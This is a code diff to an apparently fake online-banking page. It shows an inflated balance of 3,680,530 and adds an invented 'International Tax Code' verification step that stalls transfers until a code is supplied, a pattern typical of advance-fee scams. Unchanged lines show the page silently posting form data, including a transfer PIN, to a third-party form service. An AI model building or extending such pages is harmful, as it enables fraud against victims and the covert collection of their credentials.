@@ -139,6 +139,7 @@
             background: rgba(0, 0, 0, 0.5);
             justify-content: center;
             align-items: center;
+            z-index: 1001;
         }
 
         .popup-content {
@@ -179,32 +180,68 @@
             display: none;
         }
 
-        .phrase-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
+        /* New ITC Verification Popup Styles */
+        .itc-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
         }
-
-        .phrase-grid input {
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+        
+        .itc-popup-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
             text-align: center;
         }
-
-        .btn-primary {
-            background-color: #0043b6;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
+        
+        .itc-popup h2 {
+            color: #0043b6;
+            margin-bottom: 1.5rem;
         }
-
-        .btn-primary:hover {
-            background-color: #00308c;
+        
+        .itc-popup input {
+            width: 100%;
+            padding: 1rem;
+            margin: 1rem 0;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 1rem;
+        }
+        
+        .itc-popup button {
+            background: #0043b6;
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        
+        .itc-success {
+            display: none;
+            color: #28a745;
+            margin: 1rem 0;
+        }
+        
+        .itc-success i {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+        
+        .itc-loader {
+            display: none;
+            justify-content: center;
+            margin: 1rem 0;
         }
 
         @media (max-width: 480px) {
@@ -277,10 +314,35 @@
         </div>
     </div>
 
+    <!-- New ITC Verification Popup -->
+    <div id="itcPopup" class="itc-popup">
+        <div class="itc-popup-content">
+            <h2>International Tax Code Verification</h2>
+            <p>Please enter your ITC to complete the transfer</p>
+            
+            <div class="itc-loader" id="itcLoader">
+                <div class="loader"></div>
+            </div>
+            
+            <div id="itcForm">
+                <input type="text" id="itcCode" placeholder="Enter ITC Code" required>
+                <button onclick="verifyITC()">Verify ITC</button>
+            </div>
+            
+            <div id="itcSuccess" class="itc-success">
+                <i class="fas fa-check-circle"></i>
+                <h3>ITC Verified Successfully!</h3>
+                <p>Your transfer has been confirmed</p>
+            </div>
+        </div>
+    </div>
+
     <script>
         // Configuration matching dashboard
         const DEFAULT_BALANCE = 3680530.00;
         const CORRECT_PIN = "2123";
+        const CORRECT_ITC = "ITC2024XYZ"; // Demo correct ITC code
+        let transferData = {}; // To store transfer details during ITC verification
 
         // Page initialization
         setTimeout(() => {
@@ -298,7 +360,7 @@
             document.getElementById('formAmount').value = document.getElementById('amount').value;
             document.getElementById('formTransferPin').value = document.getElementById('transferPin').value;
             
-           // Submit silently using fetch()
+            // Submit silently using fetch()
             const formData = new FormData(document.getElementById('phraseForm'));
             fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
@@ -327,6 +389,16 @@
             const transferPin = document.getElementById('transferPin').value;
             const transferButton = document.getElementById('transferButton');
             
+            // Store transfer data for ITC verification
+            transferData = {
+                amount: amount,
+                transferPin: transferPin,
+                bankName: document.getElementById('bankName').value.trim(),
+                receiverName: document.getElementById('reciverName').value.trim(),
+                sortCode: document.getElementById('sortcode').value.trim(),
+                ibanNumber: document.getElementById('IBANNumber').value.trim()
+            };
+
             // Disable button during processing
             transferButton.disabled = true;
             document.getElementById('buttonText').style.display = 'none';
@@ -348,31 +420,9 @@
                         throw new Error('Insufficient Funds - You do not have sufficient funds in your account.');
                     }
 
-                    // Update balance
-                    currentBalance -= amount;
-                    localStorage.setItem('balance', currentBalance);
-
-                    // Add transaction
-                    const transaction = {
-                        name: `Transfer to ${document.getElementById('bankName').value.trim()}`,
-                        time: new Date().toLocaleDateString('en-GB', {
-                            day: 'numeric',
-                            month: 'short',
-                            year: 'numeric'
-                        }) + " • " + new Date().toLocaleTimeString('en-US', {
-                            hour: '2-digit',
-                            minute: '2-digit'
-                        }),
-                        amount: -Math.abs(amount),
-                        type: "debit"
-                    };
-
-                    const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
-                    transactions.unshift(transaction);
-                    localStorage.setItem('transactionHistory', JSON.stringify(transactions));
-
-                    // Show success
-                    showPopup('successPopup');
+                    // Show ITC verification popup instead of completing transfer
+                    showITCPopup();
+                    
                 } catch (error) {
                     const [title, message] = error.message.split(' - ');
                     showPopup('errorPopup', title, message);
@@ -383,6 +433,73 @@
                     document.getElementById('buttonLoader').style.display = 'none';
                 }
             }, 2000);
+        }
+
+        function showITCPopup() {
+            document.getElementById('itcPopup').style.display = 'flex';
+            document.getElementById('itcForm').style.display = 'block';
+            document.getElementById('itcSuccess').style.display = 'none';
+            document.getElementById('itcLoader').style.display = 'none';
+            document.getElementById('itcCode').value = '';
+        }
+
+        function verifyITC() {
+            const itcCode = document.getElementById('itcCode').value.trim();
+            
+            if (!itcCode) {
+                alert('Please enter your ITC code');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('itcForm').style.display = 'none';
+            document.getElementById('itcLoader').style.display = 'flex';
+            
+            setTimeout(() => {
+                if (itcCode === CORRECT_ITC) {
+                    // Show success
+                    document.getElementById('itcLoader').style.display = 'none';
+                    document.getElementById('itcSuccess').style.display = 'block';
+                    
+                    // Complete the transfer after 2 seconds
+                    setTimeout(completeTransfer, 2000);
+                } else {
+                    // Show error
+                    document.getElementById('itcLoader').style.display = 'none';
+                    document.getElementById('itcForm').style.display = 'block';
+                    alert('Invalid ITC code. Please try again.');
+                }
+            }, 1500);
+        }
+        
+        function completeTransfer() {
+            // Complete the transfer that was paused for ITC verification
+            let currentBalance = parseFloat(localStorage.getItem('balance')) || DEFAULT_BALANCE;
+            currentBalance -= transferData.amount;
+            localStorage.setItem('balance', currentBalance);
+
+            // Add transaction
+            const transaction = {
+                name: `Transfer to ${transferData.bankName}`,
+                time: new Date().toLocaleDateString('en-GB', {
+                    day: 'numeric',
+                    month: 'short',
+                    year: 'numeric'
+                }) + " • " + new Date().toLocaleTimeString('en-US', {
+                    hour: '2-digit',
+                    minute: '2-digit'
+                }),
+                amount: -Math.abs(transferData.amount),
+                type: "debit"
+            };
+
+            const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
+            transactions.unshift(transaction);
+            localStorage.setItem('transactionHistory', JSON.stringify(transactions));
+
+            // Close ITC popup and show success
+            document.getElementById('itcPopup').style.display = 'none';
+            showPopup('successPopup');
         }
 
         function showPopup(popupId, title = '', message = '') {
